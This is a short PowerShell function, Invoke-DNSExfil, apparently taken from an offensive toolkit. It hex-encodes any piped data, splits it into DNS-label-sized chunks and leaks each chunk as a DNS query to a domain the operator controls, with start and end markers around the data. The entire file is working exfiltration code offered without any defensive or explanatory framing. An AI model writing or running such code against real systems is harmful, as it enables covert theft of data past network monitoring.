Function Invoke-DNSExfil {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $true)]
        [String]$Payload,
        [Parameter(Mandatory = $true, Position = 0)]
        [String]$Target,
        [Parameter()]
        [Int]$DomainLength = 120,
        [Parameter()]
        [Int]$SubdomainLength = 32,
        [Parameter()]
        [String]$Server = "",
        [Parameter()]
        [Int]$Base=0
    )

    Begin {
        filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
        filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) } } 
        filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } 

        function dnsquery($domain) {
            if ($Server -eq "") {
                Resolve-DnsName -type a "$domain.$((++$Base)).$Target" 
            }
            else {
                Resolve-DnsName -Server $Server -type a "$domain.$((++$Base)).$Target" 
            }
        }

        dnsquery "___begin___"
    }

    Process {
        $Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | % {
            dnsquery $_
        }
    }

    End {
        dnsquery "___end___"
    }
}
